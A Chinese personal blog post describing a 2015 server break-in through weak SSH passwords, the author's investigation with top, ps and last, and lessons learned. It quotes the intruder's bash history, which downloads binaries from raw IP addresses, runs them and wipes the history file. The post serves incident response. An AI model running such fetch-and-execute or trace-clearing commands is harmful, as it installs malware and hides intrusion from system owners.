title: "服务器被黑了!"
date: 2015-04-14 00:01:27
tags:
  - 被黑了
  - 服务器日志
categories: Server/Log
keywords:
  - Pandorabox
  - Hacked
  - 渣渣
  - Arylo
  - Lintel
---

> 20150413 11:15PM, 准备睡觉的时候, lintel大大打给我说, 服务器上传流量异常.

# 我是那个时刻准备着(误)的三好程序猿
作为一个门口埋好地雷, 深夜三分钟即时上线的程序员, 立刻打开那台慢到掉渣的手提, 来处理这事.

既然有上传, 就是说程序还在运行中, 而且这服务器还没有开始正式投入, 负载不高, 稍微`top`一下就发现一个叫`prfos`的程序在跑.
查了一下, 是git用户运行它的.
遭了, 那是调试用, 所以随便弄了个弱密码, 现在被别人弄进来了....哎..我的错

# 他干了什么?
我跳到`/home/git`目录, 发现`.bash_history`还在, 天助我也!!

## 这是他执行的命令

```
su arylo
w
cat /proc/cpuinfo
ls
w
cat /proc/cpuinfo
ls
ps -x
uname -a
ss
cd //tmp
wget http://122.224.32.6:5547/prfos
wget http://183.60.110.3:6219/netns
chmod 7777 ./netns
./netns
chmod 7777 ./prfos
./prfos
cat /dev/null > ./.bash_history
```

看到第一句, 我还是蛮开心的, 至少我的密码没有被破解, 估计他觉得和git一样是弱密码,
后面的基本不用说了, 下载木马, 运行它们.
但有一句让我哭笑不得的命令出现了
`cat /dev/null > ./.bash_history`
我不知道说他是小菜鸟还是粗心什么的, 竟然可以出现这样的失误...导致我看到以上这些命令

## 停止它吧
好了, 竟然知道运行了什么, 就搜一搜怎样消灭他呗
可是无论是谷娘还是度娘, 但就是没有相关杀除的信息, 是毒性不强的问题吧?
```
arylo@localhost:/tmp$ ps -A|grep prfos
20244 ?        00:57:31 prfos
arylo@localhost:/tmp$ ps -A|grep netns
   12 ?        00:00:00 netns
20219 ?        00:00:10 netns
```
只好手动rm他们, 再kill一下他们, 并祈祷不要再运行了

PS.主要是git用户运行的程序不多, 所以基本可以找到那个是有问题的

# 还有谁

```
arylo@localhost:/proc$ last
lintel   pts/1        li406-14.members Mon Apr 13 15:54   still logged in
arylo    pts/0        183.37.34.131    Mon Apr 13 15:06   still logged in
git      pts/0        58.46.18.253     Mon Apr 13 04:54 - 04:54  (00:00)
test     pts/0        113.98.255.48    Sun Apr 12 23:32 - 23:32  (00:00)
git      pts/0        114.112.54.22    Sun Apr 12 19:48 - 20:00  (00:11)
test     pts/0        192.3.159.181    Sat Apr 11 18:04 - 18:04  (00:00)
test     pts/0        27.112.8.214     Sat Apr 11 12:51 - 12:51  (00:00)
test     pts/0        li610-201.member Fri Apr 10 16:09 - 16:09  (00:00)
git      pts/0        198.23.132.34    Fri Apr 10 11:51 - 11:51  (00:00)
test     pts/0        f499.fuchsia.fas Thu Apr  9 04:54 - 04:54  (00:00)
test     pts/0        195.154.165.112  Wed Apr  8 13:36 - 13:36  (00:00)
test     pts/0        c099-250.cloud.g Tue Apr  7 09:17 - 09:17  (00:00)
test     pts/0        113.98.255.48    Mon Apr  6 16:35 - 16:35  (00:00)
test     pts/0        176.111.32.9     Mon Apr  6 14:54 - 14:54  (00:00)
arylo    pts/0        14.157.176.72    Sat Apr  4 06:40 - 14:00  (07:19)
arylo    pts/0        183.37.30.83     Fri Apr  3 16:52 - 20:12  (03:19)
arylo    pts/1        li729-87.members Fri Apr  3 10:17 - 10:34  (00:17)
arylo    pts/0        li729-87.members Fri Apr  3 09:24 - 10:20  (00:56)
arylo    pts/0        li729-87.members Fri Apr  3 09:13 - 09:24  (00:10)
arylo    pts/0        li729-87.members Fri Apr  3 09:11 - 09:13  (00:01)
arylo    pts/0        li729-87.members Fri Apr  3 08:47 - 09:08  (00:21)
git      pts/0        bolobolo1.torser Thu Apr  2 13:47 - 13:47  (00:00)
git      pts/0        tor.scenehoster. Thu Apr  2 13:19 - 13:20  (00:00)
```

为了保证以后的不再出现这种事情, last了一下,
精了Σ( ° △ °|||)︴
竟然这么多, IP都搜一下, 好像都是肉鸡, 好在没有对这服务器做什么...
除了git, 还有test, 都是弱密码的主...还是我的（﹀＿﹀）

# 总结

总结一下这件事所暴露的问题和解决方法
> Q: SSH一下被人登上了（┬＿┬）
> A: 改SSH的端口, 保证安全性
>
> Q: 弱密码惹的祸
> A: 以后不能这样了, 内部的都要改一下
>
> Q: 竟然被人运行了程序
> A: 以后真的要分配好权限...test用户给人跑进来了, 不过设置了`nologin`, 所以没事
> A: 还有还有, 以后真的一用户一类程序比较好
> A: 定期更新密码说不定是个好方法?
